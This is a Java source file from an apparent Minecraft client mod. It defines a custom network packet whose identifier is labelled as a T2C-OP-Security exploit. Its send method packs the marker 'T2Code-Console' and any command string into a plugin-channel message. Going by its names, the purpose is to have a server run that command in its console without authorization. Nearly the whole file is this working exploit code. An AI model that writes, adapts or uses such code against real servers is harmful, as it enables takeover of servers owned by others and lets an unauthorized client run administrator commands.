package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record T2cOpSecurityPayloadPacket(String command) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, T2cOpSecurityPayloadPacket> CODEC = CustomPayload.codecOf(T2cOpSecurityPayloadPacket::write, T2cOpSecurityPayloadPacket::new);
    public static final Id<T2cOpSecurityPayloadPacket> ID = new Id<>(IdentifierConstants.T2COPSECURITY_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet.
     *
     * @param buf The buffer containing the serialized packet data.
     */
    private T2cOpSecurityPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    /**
     * Sends the T2C-OP-SECURITY data packet to the server.
     *
     * @param command The command to execute in the console.
     */
    public static void send(String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new T2cOpSecurityPayloadPacket(command)));
    }

    /**
     * Serializes the packet data into the provided buffer.
     *
     * @param buf The buffer to which the packet data will be written.
     */
    public void write(PacketByteBuf buf) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(stream);
            out.writeUTF("T2Code-Console");
            out.writeUTF(command);
            buf.writeBytes(stream.toByteArray());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Gets the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet in communication with the server.
     */
    public Id<T2cOpSecurityPayloadPacket> getId() {
        return ID;
    }
}
